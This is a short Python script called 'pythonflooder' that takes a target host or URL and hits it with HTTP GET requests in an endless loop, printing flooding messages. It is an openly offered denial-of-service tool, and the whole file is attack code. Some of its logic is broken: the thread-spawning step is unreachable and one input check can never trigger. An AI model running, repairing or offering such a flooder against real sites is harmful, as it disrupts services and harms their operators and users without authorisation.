import threading
import optparse
from os import system
from time import sleep
from sys import exit, platform
try:
	import requests
except ImportError as e:
    if platform.startswith('linux'):
        print(" please install requests  module!")
        exit(" sudo apt-get install python-requests ")
    else:
        exit()


def stresser():
    parser = optparse.OptionParser(usage="./pythonflooder.py --host IP / URL")
    parser.add_option("--host", help="target",
                       action="store", dest="host",
                       type="string")
    option, args = parser.parse_args()
    if option.host:
        host = ((option.host))
        if (host.find("http")) == -1:
            _host = "http://" + (host)
        elif (host.find("http")) == 0:
            _host = (host)
        elif not option.host:
            parser.error("--host option is required, type -h for help.")
            exit()

    while (1 < 4):
        try:
            requests.get(_host)
            threads = threading.active_count()
            print(" [*] flooding {}. threads: {}".format(_host, threads))
        except (requests.ConnectionError, requests.HTTPError):
            print("host not found. please enter a correct URL / IP.")
        except UnboundLocalError:
            print("[!] please use the --host option and provide UP / URL.")
            exit()
    _threads_()


def _threads_():
    for i in range(12):
    	a = threading.Thread(target=stresser)
    	a.start()


def main():
    system("cls")
    print("========================")
    print("pythonflooder v1.0.1.")
    print("author: frostyworks")
    print("========================")
    sleep(2)
    stresser()

main()
